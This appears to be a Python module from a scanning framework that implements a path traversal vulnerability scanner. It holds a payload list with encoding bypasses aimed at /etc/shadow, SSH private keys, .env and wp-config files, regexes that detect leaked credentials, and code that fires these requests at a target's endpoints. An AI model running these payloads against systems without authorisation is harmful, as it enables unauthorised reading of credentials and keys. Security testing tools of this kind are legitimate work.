"""Path Traversal scanner — comprehensive directory traversal with encoding bypass.

Detects path traversal vulnerabilities via:
- Classic: ../../../etc/passwd
- URL encoding: %2e%2e%2f, %2e%2e/, ..%2f
- Double URL encoding: %252e%252e%252f
- Unicode/overlong encoding: ..%c0%af, ..%ef%bc%8f
- Null byte injection: ../../../../etc/passwd%00.jpg
- Absolute path injection: /etc/passwd
- Windows-specific: ..\..\..\windows\win.ini, ..%5c..%5c
- ZIP/Archive path traversal in file download parameters
"""

from __future__ import annotations

import asyncio
import re
from typing import Any
from urllib.parse import urlencode

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# Path traversal payloads targeting Linux/Windows sensitive files
_TRAVERSAL_PAYLOADS: list[tuple[str, str, str]] = [
    # (payload, target_file, technique)
    ("../../../etc/passwd", "etc_passwd", "classic"),
    ("../../etc/passwd", "etc_passwd", "classic_short"),
    ("../../../../etc/passwd", "etc_passwd", "classic_deep"),
    ("../../../etc/shadow", "etc_shadow", "classic_shadow"),
    ("../../../etc/hosts", "etc_hosts", "classic_hosts"),
    ("../../../proc/self/environ", "proc_environ", "proc_environ"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "etc_passwd", "url_enc"),
    ("..%2f..%2f..%2fetc%2fpasswd", "etc_passwd", "partial_url_enc"),
    ("%252e%252e%252f%252e%252e%252fetc%252fpasswd", "etc_passwd", "double_url_enc"),
    ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "etc_passwd", "unicode_overlong"),
    ("..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "etc_passwd", "unicode_full_width"),
    ("....//....//....//etc/passwd", "etc_passwd", "stripped_traversal"),
    ("..././..././..././etc/passwd", "etc_passwd", "double_dots"),
    ("/etc/passwd", "etc_passwd", "absolute_path"),
    ("/etc/hosts", "etc_hosts", "absolute_hosts"),
    # Null byte injection
    ("../../../../etc/passwd%00.jpg", "etc_passwd", "null_byte_jpg"),
    ("../../../../etc/passwd%00.png", "etc_passwd", "null_byte_png"),
    ("../../../../etc/passwd%00", "etc_passwd", "null_byte"),
    # Windows
    ("..\\..\\..\\windows\\win.ini", "win_ini", "win_backslash"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "win_ini", "win_url_enc"),
    ("../../../../../windows/win.ini", "win_ini", "win_classic"),
    ("C:\\windows\\win.ini", "win_ini", "win_absolute"),
    # SSH keys
    ("../../../../home/user/.ssh/id_rsa", "ssh_key", "ssh_privkey"),
    ("../../.ssh/authorized_keys", "ssh_auth", "ssh_authkeys"),
    # Application configs
    ("../../config.php", "config_php", "app_config"),
    ("../../.env", "dotenv", "env_file"),
    ("../../wp-config.php", "wp_config", "wordpress"),
]

# Parameters that commonly accept file paths
_FILE_PARAMS: list[str] = [
    "file", "path", "filename", "filepath", "dir", "directory",
    "page", "doc", "document", "template", "view", "include",
    "load", "source", "src", "url", "location", "resource",
    "name", "img", "image", "content", "data", "feed",
]

# Paths to test
_TEST_PATHS: list[str] = [
    "/", "/download", "/view", "/file", "/read",
    "/api/download", "/api/file", "/api/view",
    "/static", "/assets", "/media",
    "/getfile", "/showfile", "/viewfile",
]

# Detection patterns
_TRAVERSAL_SUCCESS_PATTERNS: dict[str, re.Pattern[str]] = {
    "etc_passwd": re.compile(r'root:.*:/bin/(ba)?sh|daemon:x:\d+', re.I),
    "etc_shadow": re.compile(r'root:\$[16y]\$|nobody:\*:', re.I),
    "etc_hosts": re.compile(r'127\.0\.0\.1.*localhost', re.I),
    "proc_environ": re.compile(r'HOME=/|PATH=/usr|HOSTNAME=', re.I),
    "win_ini": re.compile(r'\[fonts\]|\[extensions\]|\[mci', re.I),
    "ssh_key": re.compile(r'-----BEGIN (RSA |OPENSSH )?PRIVATE KEY-----', re.I),
    "ssh_auth": re.compile(r'ssh-rsa AAAA|ssh-ed25519 AAAA', re.I),
    "config_php": re.compile(r'define\s*\(\s*[\'"]DB_|mysql_connect', re.I),
    "dotenv": re.compile(r'DB_PASSWORD=|SECRET_KEY=|APP_KEY=', re.I),
    "wp_config": re.compile(r'define\s*\(\s*[\'"]DB_NAME|table_prefix', re.I),
}


class PathTraversalScanner(BaseOsintScanner):
    """Comprehensive path traversal vulnerability scanner.

    Tests file download/view parameters with 25+ encoding variants
    targeting Linux, Windows, and application-specific sensitive files.
    """

    scanner_name = "path_traversal"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 3600
    scan_timeout = 90

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []
        # Track confirmed vulnerable endpoints to avoid duplicates
        confirmed: set[str] = set()

        async with httpx.AsyncClient(
            timeout=8,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; PathTraversalScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(10)

            async def test_traversal(path: str, param: str, payload: str,
                                      target: str, technique: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    full_url = f"{url}?{param}={payload}"
                    try:
                        resp = await client.get(full_url)
                        if resp.status_code != 200 or len(resp.content) < 10:
                            return

                        body = resp.text
                        detection_key = f"{param}:{technique}"
                        if detection_key in confirmed:
                            return

                        pattern = _TRAVERSAL_SUCCESS_PATTERNS.get(target)
                        if pattern and pattern.search(body):
                            confirmed.add(detection_key)
                            evidence = pattern.search(body).group(0)[:80]
                            severity = "critical" if target in ("etc_shadow", "ssh_key", "dotenv",
                                                                 "wp_config", "config_php") else "high"
                            vulnerabilities.append({
                                "type": "path_traversal",
                                "severity": severity,
                                "url": full_url,
                                "parameter": param,
                                "payload": payload,
                                "technique": technique,
                                "target_file": target,
                                "evidence": evidence,
                                "description": f"Path traversal confirmed via '{param}' — "
                                               f"sensitive file '{target}' readable using {technique}",
                                "remediation": "Validate file paths; use allowlist of permitted files; "
                                               "chroot web server process; never pass user input to open()",
                            })
                            ident = f"vuln:traversal:{target}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            tasks = []
            for path in _TEST_PATHS[:4]:
                for param in _FILE_PARAMS[:8]:
                    for payload, target, technique in _TRAVERSAL_PAYLOADS[:15]:
                        tasks.append(test_traversal(path, param, payload, target, technique))

            await asyncio.gather(*tasks)

        severity_counts: dict[str, int] = {}
        for v in vulnerabilities:
            s = v.get("severity", "info")
            severity_counts[s] = severity_counts.get(s, 0) + 1

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "severity_summary": severity_counts,
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
